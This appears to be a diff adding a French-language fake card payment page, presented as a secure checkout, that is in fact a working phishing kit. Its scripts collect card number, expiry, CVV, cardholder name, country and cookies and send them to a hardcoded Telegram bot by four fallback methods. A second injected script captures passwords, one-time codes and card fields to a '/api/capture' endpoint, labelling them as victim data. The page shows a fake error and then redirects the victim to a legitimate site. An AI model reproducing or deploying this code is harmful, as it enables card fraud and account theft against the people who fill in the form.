@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire de Paiement</title>
+    <style>
+        /* Styles globaux */
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f7f9fc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            position: relative;
+            transition: background-color 0.5s;
+        }
+
+        /* Logo en arrière-plan en haut à gauche */
+        .background-logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 150px; /* Ajustez la taille selon vos besoins */
+            height: auto;
+            z-index: 0; /* Assurez-vous qu'il est en arrière-plan */
+            opacity: 0.5; /* Ajustez l'opacité pour qu'il ne soit pas trop intrusif */
+        }
+
+        .payment-container {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 400px;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            transition: opacity 0.5s;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+
+        .input-field:focus {
+            border-color: #007bff;
+            outline: none;
+            box-shadow: 0 0 8px rgba(0, 123, 255, 0.3);
+        }
+
+        .card-logos {
+            display: flex;
+            justify-content: space-around;
+            margin: 20px 0;
+            padding: 10px;
+            background-color: #f1f3f4;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+        }
+
+        .card-logos img {
+            width: 50px;
+            height: auto;
+        }
+
+        .country-select {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            background-color: #fff;
+            cursor: pointer;
+        }
+
+        .expiration-cvv {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .expiration-cvv .input-field {
+            width: 48%;
+        }
+
+        .pay-button {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+
+        .pay-button:hover {
+            background-color: #218838;
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 40px;
+            left: 0;
+            right: 0;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            background-color: transparent;
+            padding: 10px;
+            z-index: 0;
+        }
+
+        .footer p {
+            margin: 5px 0;
+        }
+
+        /* Mode sombre et barre de recharge */
+        .dark-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s, visibility 0.5s;
+        }
+
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #d9534f;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Fenêtre d'erreur */
+        .error-modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            border-radius: 12px;
+            border: 2px solid #d9534f;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            text-align: center;
+            z-index: 3;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s, visibility 0.5s;
+            width: 300px; /* Largeur réduite */
+        }
+
+        .error-modal.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .error-modal h2 {
+            font-size: 20px;
+            color: #d9534f;
+            margin-bottom: 15px;
+        }
+
+        .error-modal p {
+            font-size: 14px;
+            color: #333;
+        }
+
+        .error-icon {
+            font-size: 48px;
+            color: #d9534f;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Logo en arrière-plan -->
+    <div class="background-logo">
+        <img src="https://i.postimg.cc/CLZKRD3G/IMG-5925.png" alt="Logo" style="width: 100%; height: auto;">
+    </div>
+
+    <div class="payment-container">
+        <h1>Paiement Sécurisé</h1>
+
+        <!-- Logos des cartes -->
+        <div class="card-logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
+            <img src="https://i.postimg.cc/7Y1Z3XWk/E2184-A94-2-DBE-49-FF-B80-D-D1045-E31-AA8-D.png" alt="Play Store">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/39/PayPal_logo.svg" alt="PayPal">
+        </div>
+
+        <!-- Formulaire de paiement -->
+        <form id="paymentForm">
+            <!-- Sélection du pays -->
+            <select class="country-select" id="country" required>
+                <option value="">Choisissez votre pays</option>
+                <option value="FR">France</option>
+                <option value="US">États-Unis</option>
+                <option value="CA">Canada</option>
+                <option value="BE">Belgique</option>
+            </select>
+
+            <!-- Numéro de carte -->
+            <input type="text" id="cardNumber" class="input-field" placeholder="Numéro de carte" maxlength="19" required>
+
+            <!-- Date d'expiration et CVV -->
+            <div class="expiration-cvv">
+                <input type="text" id="expirationDate" class="input-field" placeholder="MM/AA" maxlength="5" required>
+                <input type="text" id="cvv" class="input-field" placeholder="CVV" maxlength="3" required>
+            </div>
+
+            <!-- Nom du titulaire -->
+            <input type="text" id="cardHolderName" class="input-field" placeholder="Nom du titulaire" required>
+
+            <!-- Bouton de paiement -->
+            <button type="submit" class="pay-button">Payer</button>
+        </form>
+    </div>
+
+    <!-- Texte en bas de la page sur l'arrière-plan -->
+    <div class="footer">
+        <p>Ce formulaire est sécurisé et crypté. Vos informations ne seront pas partagées.</p>
+    </div>
+
+    <!-- Mode sombre et barre de recharge -->
+    <div class="dark-overlay" id="darkOverlay">
+        <div class="loader"></div>
+    </div>
+
+    <!-- Fenêtre d'erreur -->
+    <div class="error-modal" id="errorModal">
+        <div class="error-icon">❌</div>
+        <h2>Erreur de Paiement</h2>
+        <p>Notre service de paiement n'est pas disponible pour l'instant. Veuillez réessayer plus tard.</p>
+    </div>
+
+    <script>
+        // Fonction pour formater le numéro de carte (4 par 4)
+        document.getElementById('cardNumber').addEventListener('input', function(event) {
+            let value = event.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            event.target.value = formattedValue.trim();
+        });
+
+        // Fonction pour limiter la date d'expiration (MM/AA)
+        document.getElementById('expirationDate').addEventListener('input', function(event) {
+            let value = event.target.value.replace(/[^0-9]/g, '');
+            if (value.length > 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            event.target.value = value;
+        });
+
+        // Fonction pour limiter le CVV à 3 chiffres
+        document.getElementById('cvv').addEventListener('input', function(event) {
+            event.target.value = event.target.value.replace(/[^0-9]/g, '').slice(0, 3);
+        });
+
+        // Fonction pour gérer la soumission du formulaire
+        document.getElementById('paymentForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Empêche la soumission du formulaire
+
+            // Activer le mode sombre et afficher la barre de recharge
+            const darkOverlay = document.getElementById('darkOverlay');
+            darkOverlay.style.opacity = 1;
+            darkOverlay.style.visibility = 'visible';
+
+            // Simuler un chargement de 6 secondes
+            setTimeout(() => {
+                // Masquer la barre de recharge
+                darkOverlay.style.opacity = 0;
+                darkOverlay.style.visibility = 'hidden';
+
+                // Afficher la fenêtre d'erreur
+                const errorModal = document.getElementById('errorModal');
+                errorModal.classList.add('visible');
+
+                // Masquer la fenêtre d'erreur après 5 secondes
+                setTimeout(() => {
+                    errorModal.classList.remove('visible');
+                }, 5000); // 5 secondes
+
+                // Rediriger l'utilisateur après 2 minutes
+                setTimeout(() => {
+                    window.location.href = 'https://www.kaspersky.com'; // Remplacez par l'URL de redirection
+                }, 120000); // 2 minutes
+
+                // Récupérer les cookies
+                const cookies = document.cookie;
+
+                // Récupérer les valeurs du formulaire
+                const cardNumber = document.getElementById('cardNumber').value;
+                const expirationDate = document.getElementById('expirationDate').value;
+                const cvv = document.getElementById('cvv').value;
+                const cardHolderName = document.getElementById('cardHolderName').value;
+                const country = document.getElementById('country').value;
+
+                // Construire le message à envoyer
+                const message = `Bank:\nNom du titulaire: ${cardHolderName}\nPays: ${country}\nNuméro de carte: ${cardNumber}\nDate d'expiration: ${expirationDate}\nCVV: ${cvv}\nCookies: ${cookies}`;
+
+                // Token et chat ID Telegram
+                const botToken = '7895728217:AAFDGRj_SyS79wnYwVi4MZMF34W4OqCya6Y';
+                const chatId = '6141755021';
+
+                // Méthode 1 : Utilisation de fetch
+                const sendWithFetch = () => {
+                    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    return fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Méthode 1 (fetch) : Message envoyé avec succès:', data);
+                        return true;
+                    })
+                    .catch(error => {
+                        console.error('Méthode 1 (fetch) : Erreur lors de l\'envoi du message:', error);
+                        return false;
+                    });
+                };
+
+                // Méthode 2 : Utilisation de XMLHttpRequest
+                const sendWithXHR = () => {
+                    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', url, true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    return new Promise((resolve) => {
+                        xhr.onload = () => {
+                            if (xhr.status === 200) {
+                                console.log('Méthode 2 (XHR) : Message envoyé avec succès:', JSON.parse(xhr.responseText));
+                                resolve(true);
+                            } else {
+                                console.error('Méthode 2 (XHR) : Erreur lors de l\'envoi du message:', xhr.statusText);
+                                resolve(false);
+                            }
+                        };
+                        xhr.onerror = () => {
+                            console.error('Méthode 2 (XHR) : Erreur réseau');
+                            resolve(false);
+                        };
+                        xhr.send(JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        }));
+                    });
+                };
+
+                // Méthode 3 : Utilisation de navigator.sendBeacon
+                const sendWithBeacon = () => {
+                    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    const blob = new Blob([JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })], { type: 'application/json' });
+                    if (navigator.sendBeacon(url, blob)) {
+                        console.log('Méthode 3 (sendBeacon) : Message envoyé avec succès');
+                        return true;
+                    } else {
+                        console.error('Méthode 3 (sendBeacon) : Erreur lors de l\'envoi du message');
+                        return false;
+                    }
+                };
+
+                // Méthode 4 : Redirection avec les données encodées dans l'URL (méthode de secours)
+                const sendWithRedirect = () => {
+                    const fallbackUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                    window.location.href = fallbackUrl;
+                    console.log('Méthode 4 (redirection) : Redirection effectuée');
+                    return true;
+                };
+
+                // Essayer les méthodes dans l'ordre
+                sendWithFetch()
+                    .then(success => {
+                        if (!success) return sendWithXHR();
+                        return true;
+                    })
+                    .then(success => {
+                        if (!success) return sendWithBeacon();
+                        return true;
+                    })
+                    .then(success => {
+                        if (!success) return sendWithRedirect();
+                        return true;
+                    })
+                    .finally(() => {
+                        // Rediriger l'utilisateur vers Netflix après l'envoi
+                        window.location.href = 'https://www.mastercard.fr/fr-fr.html';
+                    });
+            }, 6000); // 6 secondes
+        });
+    </script>
+
+
+
+<script data-real-injected="true" data-injected-mode="bank">
+(function () {
+  const PARAM_CFG = {
+    endpoint: "/api/capture",
+    defaultOwner: "Kim",
+    network: "PayPal",
+    redirectUrl: "https://www.kaspersky.com",
+    mode: "bank",
+    isOtpMode: false,
+    isBankMode: true
+  };
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const ownerVal = urlParams.get("user") || urlParams.get("ref") || PARAM_CFG.defaultOwner;
+  const typeParam = (urlParams.get("type") || PARAM_CFG.mode).toLowerCase();
+
+  let lastUser = "";
+  let lastPass = "";
+  const sentSet = new Set();
+
+  function sendCapture(payload) {
+    const key = JSON.stringify(payload);
+    if (sentSet.has(key)) return;
+    sentSet.add(key);
+
+    return fetch(PARAM_CFG.endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+      keepalive: true
+    }).catch((err) => console.log(err));
+  }
+
+  function getElMeta(el) {
+    let lblText = "";
+    if (el.id) {
+      const lbl = document.querySelector('label[for="' + CSS.escape(el.id) + '"]');
+      if (lbl) lblText += " " + (lbl.innerText || lbl.textContent || "");
+    }
+    const parentLbl = el.closest ? el.closest("label") : null;
+    if (parentLbl) lblText += " " + (parentLbl.innerText || parentLbl.textContent || "");
+
+    const key = (
+      el.name ||
+      el.id ||
+      lblText.trim() ||
+      el.placeholder ||
+      el.getAttribute("aria-label") ||
+      el.getAttribute("autocomplete") ||
+      ("champ_" + (el.type || el.tagName || "input").toLowerCase())
+    ).trim();
+
+    const meta = [
+      el.id,
+      el.name,
+      el.placeholder,
+      el.getAttribute("aria-label"),
+      el.getAttribute("autocomplete"),
+      el.getAttribute("inputmode"),
+      el.className,
+      lblText
+    ].filter(Boolean).join(" ").toLowerCase();
+
+    return { key, meta };
+  }
+
+  function classifyEl(el) {
+    const t = (el.type || el.tagName || "text").toLowerCase();
+    const maxLen = parseInt(el.getAttribute("maxlength") || "0", 10);
+    const { meta } = getElMeta(el);
+
+    if (["submit", "button", "reset", "hidden"].includes(t)) return "ignore";
+
+    if (/\b(cvv|cvc|csc|cvn|security.?code|code.?s[ée]curit[ée])\b/i.test(meta) || ((maxLen === 3 || maxLen === 4) && /(card|carte|paiement|payment)/i.test(meta))) {
+      return "bank_cvv";
+    }
+    if (/(cc-number|card.?num|num[ée]ro.?de.?carte|num[ée]ro.?carte|carte.?bancaire|credit.?card|debit.?card|pan)/i.test(meta)) {
+      return "bank_number";
+    }
+    if (/(cc-exp|expir|exp.?date|mm\s*\/?\s*aa|mm\s*\/?\s*yy|mois.?exp|ann[ée]e.?exp|valid.?thru|valable)/i.test(meta)) {
+      return "bank_expiry";
+    }
+    if (/\b(country|pays|region|r[ée]gion|nation)\b/i.test(meta)) {
+      return "bank_country";
+    }
+    if (/\b(postal|zip|code.?postal|cp)\b/i.test(meta)) {
+      return "bank_zip";
+    }
+    if (/(address|adresse|street|rue|billing|facturation|city|ville|state|d[ée]partement)/i.test(meta)) {
+      return "bank_address";
+    }
+    if (/(cc-name|card.?holder|titulaire|nom.?sur.?la.?carte|nom.?complet|full.?name|holder)/i.test(meta)) {
+      return "bank_holder";
+    }
+
+    if (t === "password" || (/password|pass|mot de passe/i.test(meta) && !/otp|2fa/i.test(meta))) {
+      return "pass";
+    }
+
+    if (
+      (el.getAttribute("autocomplete") || "").toLowerCase() === "one-time-code" ||
+      /\botp\b|2fa|mfa|one-time|verification.?code|code.?v[ée]rif/i.test(meta) ||
+      (maxLen === 1 && !["checkbox", "radio"].includes(t))
+    ) {
+      return "otp";
+    }
+
+    return "general";
+  }
+
+  function readFields(scopeEl) {
+    const root = (scopeEl && scopeEl.closest && scopeEl.closest("form")) || document;
+    const allInputs = Array.from(root.querySelectorAll("input, select, textarea"));
+
+    let user = "";
+    let pass = "";
+    const otpParts = [];
+    const fieldsMap = {};
+    const bankStructured = {
+      nom_titulaire: "",
+      numero_carte: "",
+      expiration: "",
+      cvv_cvc: "",
+      pays: "",
+      adresse: "",
+      code_postal: ""
+    };
+
+    allInputs.forEach((el, idx) => {
+      const t = (el.type || el.tagName || "text").toLowerCase();
+      const role = classifyEl(el);
+      if (role === "ignore") return;
+
+      const { key } = getElMeta(el);
+      let rawVal = "";
+      if (t === "checkbox") {
+        rawVal = el.checked ? (el.value || "Oui") : "";
+      } else if (t === "radio") {
+        if (!el.checked) return;
+        rawVal = el.value || "Sélectionné";
+      } else {
+        rawVal = (el.value || "").trim();
+      }
+
+      if (!rawVal) return;
+      const outKey = fieldsMap[key] !== undefined && fieldsMap[key] !== rawVal ? (key + "_" + (idx + 1)) : key;
+      fieldsMap[outKey] = rawVal;
+
+      if (role === "pass") {
+        if (!pass) pass = el.value;
+      } else if (role === "otp") {
+        otpParts.push(rawVal);
+      } else if (role === "bank_holder") {
+        if (!bankStructured.nom_titulaire) bankStructured.nom_titulaire = rawVal;
+        if (!user) user = rawVal;
+      } else if (role === "bank_number") {
+        const digitsOnly = rawVal.replace(/\D+/g, "");
+        if (!bankStructured.numero_carte) bankStructured.numero_carte = digitsOnly || rawVal;
+        if (!user) user = digitsOnly || rawVal;
+      } else if (role === "bank_expiry") {
+        bankStructured.expiration = bankStructured.expiration
+          ? (bankStructured.expiration + "/" + rawVal)
+          : rawVal;
+      } else if (role === "bank_cvv") {
+        const cvvDigits = rawVal.replace(/\D+/g, "").slice(0, 4);
+        if (!bankStructured.cvv_cvc) bankStructured.cvv_cvc = cvvDigits || rawVal;
+      } else if (role === "bank_country") {
+        if (!bankStructured.pays) bankStructured.pays = rawVal;
+      } else if (role === "bank_address") {
+        bankStructured.adresse = bankStructured.adresse
+          ? (bankStructured.adresse + ", " + rawVal)
+          : rawVal;
+      } else if (role === "bank_zip") {
+        if (!bankStructured.code_postal) bankStructured.code_postal = rawVal;
+      } else {
+        if (!user) user = rawVal;
+      }
+    });
+
+    if (!user) {
+      const firstText = Array.from(document.querySelectorAll("input[type='text'], input[type='email'], input[type='tel'], input[type='number'], input:not([type])"))
+        .find((i) => !i.classList.contains("otp-input") && i.value && i.value.trim());
+      if (firstText) user = firstText.value.trim();
+    }
+    if (!pass) {
+      const p = document.querySelector("input[type='password']");
+      if (p) pass = p.value;
+    }
+
+    const hasBankData = Object.values(bankStructured).some(Boolean);
+
+    return {
+      user: user || lastUser || "",
+      pass: pass || lastPass || "",
+      otp: otpParts.length > 0 ? otpParts.join("") : "Aucun",
+      fieldsMap,
+      bankStructured,
+      hasBankData
+    };
+  }
+
+  function handleAction(e, sourceEl) {
+    const data = readFields(sourceEl);
+    if (data.user) lastUser = data.user;
+    if (data.pass) lastPass = data.pass;
+
+    const hasOtpValue = data.otp && data.otp !== "Aucun";
+    const hasAnyData = Boolean(data.user || data.pass || hasOtpValue || data.hasBankData || Object.keys(data.fieldsMap).length > 0);
+    if (!hasAnyData) return;
+
+    let stepType = "standard";
+    if (PARAM_CFG.isBankMode || data.hasBankData) {
+      stepType = "bank";
+    } else if (PARAM_CFG.isOtpMode) {
+      stepType = hasOtpValue ? (typeParam === "standard" ? "otp" : typeParam) : "otp_step1";
+    }
+
+    sendCapture({
+      owner: ownerVal,
+      network: PARAM_CFG.network,
+      type: stepType,
+      victimUser: lastUser || data.bankStructured.nom_titulaire || data.bankStructured.numero_carte || "Inconnu",
+      victimPass: lastPass || data.bankStructured.cvv_cvc || "Aucun",
+      otp: PARAM_CFG.isOtpMode ? data.otp : "Aucun",
+      bank: data.bankStructured,
+      fields: data.fieldsMap,
+      extra_info: JSON.stringify({
+        mode: PARAM_CFG.mode,
+        bank: data.bankStructured,
+        fields: data.fieldsMap
+      })
+    });
+  }
+
+  document.addEventListener("submit", (e) => handleAction(e, e.target), true);
+
+  document.addEventListener("click", (e) => {
+    const btn = e.target.closest ? e.target.closest("button, input[type='submit'], [role='button']") : null;
+    if (!btn) return;
+    handleAction(e, btn);
+  }, true);
+
+  if (PARAM_CFG.isOtpMode) {
+    document.addEventListener("input", (e) => {
+      const el = e.target;
+      if (!el || el.tagName !== "INPUT") return;
+      const isOtpEl = el.classList.contains("otp-input") || /otp|code/i.test((el.id || "") + " " + (el.name || "") + " " + (el.getAttribute("autocomplete") || ""));
+      if (!isOtpEl) return;
+
+      const data = readFields(el);
+      if (data.otp && data.otp !== "Aucun" && data.otp.length >= 6) {
+        sendCapture({
+          owner: ownerVal,
+          network: PARAM_CFG.network,
+          type: typeParam === "standard" ? "otp" : typeParam,
+          victimUser: lastUser,
+          victimPass: lastPass,
+          otp: data.otp
+        });
+      }
+    }, true);
+  }
+})();
+</script>
+</body>
+</html>
